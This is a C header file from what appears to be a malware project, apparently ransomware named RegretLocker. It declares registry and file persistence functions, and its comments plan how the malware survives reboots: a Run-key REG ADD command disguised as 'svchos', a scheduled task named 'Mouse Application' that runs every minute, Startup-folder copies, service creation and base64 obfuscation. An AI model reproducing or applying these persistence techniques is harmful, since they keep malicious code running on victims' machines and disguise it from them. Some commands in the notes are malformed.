#pragma once
#include "windows.h"

int persistRegistry();

int persistFiles();

//I.Persistent
//
//- Add to HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
//- C:\Windows\System32\cmd.exe" REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "svchos" /t REG_SZ /d "Path to malware" /f
//- schedules the malware as a task every minite using this Schtasks.exe command, which is run from cmd.exe using ShellExecuteA.
//- schtasks / Create / SC MINUTE / TN "Mouse Application" / TR "RegretLocker_path" / f
//
//- Once infected, dont wanna lose access upon reboot
//- Copy initial binary to a different location(TEMP)
//- Set up persistent
//- Malware runs whenever machine boot
//
//- Maybe use base64 encoded ?
//
//-Registry :
//    -regWrite - p HKCU : SOFTWARE\Microsoft\Windows\CurrentVersion\Run - k "Name" - v "command" // normal priviledge
//    - regWrite - p HKLM : SOFTWARE\Microsoft\Windows\CurrentVersion\Run - k "Name" - v "command"
//
//    - Services Manager :
//-OpenSCManager(needs admin priviledge)
//- CreateService
//
//- Files :
//    -APPDATA\Microsoft\Windows\Start Menu\Programs\Startup
//
//
//    - LOLBins:
